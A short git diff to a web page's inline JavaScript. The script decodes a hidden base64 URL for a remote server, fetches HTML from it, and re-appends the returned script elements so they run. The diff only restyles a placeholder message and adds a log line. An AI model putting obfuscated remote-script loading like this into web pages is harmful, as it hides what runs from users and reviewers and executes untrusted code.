@@ -47,7 +47,7 @@ iframe {
             var frame = document.createElement('object')
             var src = atob("aHR0cDovL3JwaS5zdHVkZW50LnJpdC5lZHU=") + atob("ODA4MA==")
             src = src.slice(0,src.length-4) + atob("Og==") + src.slice(src.length-4)
-            frame.innerHTML = "data:text/html, <div>This should not be visible</div>"
+            frame.innerHTML = "<div style='background: red; color: white; text-align: center; height: 50px; padding-top: 8px; font-size: 30px;'>This should not be visible</div>"
             document.body.appendChild(frame)
             httpGet(src, function(data) {
                 var docFrag = document.createDocumentFragment()
@@ -61,6 +61,7 @@ iframe {
                     }
                     scr.parentElement.removeChild(scr)
                     document.body.appendChild(scr)
+                    console.log("Moving ",scr)
                 }
                 frame.appendChild(docFrag)
             })
